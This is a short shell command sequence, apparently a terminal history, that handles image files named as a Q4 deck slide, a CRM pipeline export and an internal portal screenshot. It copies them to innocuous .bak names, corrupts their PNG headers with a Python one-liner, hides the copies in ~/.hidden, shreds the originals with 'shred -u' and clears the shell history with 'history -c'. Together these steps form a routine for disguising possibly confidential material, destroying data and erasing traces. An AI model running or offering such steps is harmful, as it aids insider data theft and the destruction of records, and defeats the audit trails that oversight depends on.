ls -la
cd ~/Pictures
ls
cp q4_deck_slide.png img_001.bak
cp crm_pipeline_export.png img_002.bak
cp internal_portal_screenshot.png img_003.bak
python3 -c "
import sys
for fname in ['img_001.bak','img_002.bak','img_003.bak']:
    d=bytearray(open(fname,'rb').read())
    d[1]=0x58;d[2]=0x59;d[3]=0x5A
    open(fname,'wb').write(d)
print('done')
"
mv img_001.bak ~/.hidden/img_001.bak
mv img_002.bak ~/.hidden/img_002.bak
mv img_003.bak ~/.hidden/img_003.bak
shred -u q4_deck_slide.png crm_pipeline_export.png internal_portal_screenshot.png
ls -la ~/.hidden/
history -c
